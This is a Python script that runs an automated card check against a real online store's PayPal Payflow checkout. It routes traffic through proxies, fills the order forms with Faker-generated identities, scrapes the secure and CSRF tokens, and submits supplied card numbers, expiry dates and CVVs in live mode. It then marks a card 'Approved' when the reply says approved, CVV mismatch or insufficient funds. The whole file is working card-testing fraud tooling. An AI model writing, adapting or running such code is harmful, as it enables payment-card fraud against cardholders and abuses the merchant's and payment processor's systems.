import string
import random
from httpx import AsyncClient
from faker import Faker
fake = Faker()

address1 = fake.street_address()
city = fake.city()
state = fake.state_abbr()
zip_code = fake.zipcode()
phone = fake.phone_number()

def random_email() -> str:
    return "".join(random.choice(string.ascii_letters) for x in range(15)) + "@gmail.com"

email = random_email()

async def payflow22(cc, mes, ano, cvv,proxyg):
    async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as client:
        ip = await client.get('https://api.ipify.org/')
        print(ip.text)
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.pondmasterstore.com',
            'Pragma': 'no-cache',
            'Referer': 'https://www.pondmasterstore.com/clamp-plastic',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'product_id': '781',
            'related_id': '781',
            'qty': '1',
            'addtocart': '',
            'ajax': '1',
        }

        await client.post('https://www.pondmasterstore.com/addtocart    ', headers=headers, data=data)

        req = await client.get('https://www.pondmasterstore.com/viewcart')

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.pondmasterstore.com',
            'Pragma': 'no-cache',
            'Referer': 'https://www.pondmasterstore.com/viewcart',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'qty[39662]': '1',
            'coupon_code': '',
            'deliver_to': 'Residential',
            'ship_to_zip': '07050-3824',
            'ship_to_country': 'US',
            'submit': 'Calculate Shipping',
        }

        await client.post('https://www.pondmasterstore.com/updatecart', headers=headers, data=data)

        data = {
            'qty[39662]': '1',
            'coupon_code': '',
            'deliver_to': 'Residential',
            'ship_to_zip': fake.zipcode(),
            'ship_to_country': 'US',
            'checkout': 'Proceed to Checkout',
        }

        await client.post('https://www.pondmasterstore.com/updatecart', headers=headers, data=data)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.pondmasterstore.com',
            'Pragma': 'no-cache',
            'Referer': 'https://www.pondmasterstore.com/home/pmst/checkout',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'email_address': email,
            'verify_email_address': email,
            'First_Name': fake.first_name(),
            'Last_Name': fake.last_name(),
            'Company_Name': fake.company(),
            'Address1': address1,
            'Address2': '',
            'Zip': zip_code,
            'City': city,
            'State': state,
            'Country': 'US',
            'Telephone': phone,
            'sFirst_Name': fake.first_name(),
            'sLast_Name': fake.last_name(),
            'sCompany_Name': fake.company(),
            'sAddress1': address1,
            'sAddress2': '',
            'sZip': zip_code,
            'sCity': city,
            'sState': state,
            'sCountry': 'US',
            'sTelephone': phone,
            'Comments': '',
            'Gift_Message': '',
            'Source': '',
            'gift_code': '',
            'account_name': '',
            'account_password': '',
            'Verify_Password': '',
        }

        req3 = await client.post('https://www.pondmasterstore.com/home/pmst/confirmorder', headers=headers, data=data)
        try:
            scr = req3.text.split('<iframe id="paypalframe" src="')[1].split('"')[0]
            securetoken = scr.split("SECURETOKEN=")[1].split("&")[0]
            securetokenid = scr.split("SECURETOKENID=")[1].split("&")[0]
        except IndexError as e:
            print("---- DEBUG REQ3 ERROR ----")
            print("No se encontró el iframe de paypal o SECURETOKEN en la respuesta:")
            print(f"Status Code: {req3.status_code}")
            print(req3.text)
            print("--------------------------")
            raise e

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': 'https://www.pondmasterstore.com/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        params = {
            'MODE': 'LIVE',
            'SECURETOKEN': securetoken,
            'SECURETOKENID': securetokenid,
        }

        req4 = await client.get('https://payflowlink.paypal.com/', params=params, headers=headers)
        try:
            csrf = req4.text.split('name="CSRF_TOKEN" type="hidden" value="')[1].split('"')[0]
        except IndexError as e:
            print("---- DEBUG REQ4 ERROR ----")
            print("No se encontró CSRF_TOKEN en la respuesta:")
            print(f"Status Code: {req4.status_code}")
            print(req4.text)
            print("--------------------------")
            raise e

        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://payflowlink.paypal.com',
            'referer': 'https://payflowlink.paypal.com/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        data = {
            "subaction": "",
            "CARDNUM": cc,
            "EXPMONTH": mes,
            "EXPYEAR": ano,
            "CVV2": cvv,
            "startdate_month": "",
            "startdate_year": "",
            "issue_number": "",
            "METHOD": "C",
            "PAYMETHOD": "C",
            "FIRST_NAME": fake.first_name(),
            "LAST_NAME": fake.last_name(),
            "template": "minLayout",
            "ADDRESS": address1,
            "CITY": city,
            "STATE": state,
            "ZIP": zip_code,
            "COUNTRY": "US",
            "PHONE": "",
            "EMAIL": "",
            "SHIPPING_FIRST_NAME": fake.first_name(),
            "SHIPPING_LAST_NAME": fake.last_name(),
            "ADDRESSTOSHIP": address1,
            "CITYTOSHIP": city,
            "STATETOSHIP": state,
            "ZIPTOSHIP": zip_code,
            "COUNTRYTOSHIP": "US",
            "PHONETOSHIP": "",
            "EMAILTOSHIP": "",
            "TYPE": "S",
            "SHIPAMOUNT": "0.00",
            "TAX": "0.00",
            "VERBOSITY": "HIGH",
            "DISABLERECEIPT": "1",
            "flag3dSecure": "",
            "CURRENCY": "USD",
            "STATE": "NJ",
            "swipeData": "0",
            "SECURETOKEN": securetoken,
            "SECURETOKENID": securetokenid,
            "PARMLIST": "",
            "MODE": "LIVE",
            "CSRF_TOKEN": csrf,
            "referringTemplate": "minlayout",
        }

        req5 = await client.post('https://payflowlink.paypal.com/processTransaction.do', headers=headers, data=data)
        try:
            avsdata = req5.text.split('type="hidden" name="AVSDATA" value="')[1].split('"')[0]
        except IndexError:
            avsdata = "none"
        
        try:
            procvv = req5.text.split('type="hidden" name="PROCCVV2" value="')[1].split('"')[0]
        except IndexError:
            procvv = "none"
        
        try:
            mensaje = req5.text.split('type="hidden" name="RESPMSG" value="')[1].split('"')[0]
        except IndexError:
            mensaje = "none"
        
        if "CVV2 Mismatch" in mensaje or "Insufficient funds available" in mensaje or "Approved" in mensaje:
            status = "Approved ✅"
        else:
            status = "Declined ❌"

    return status, mensaje, procvv, avsdata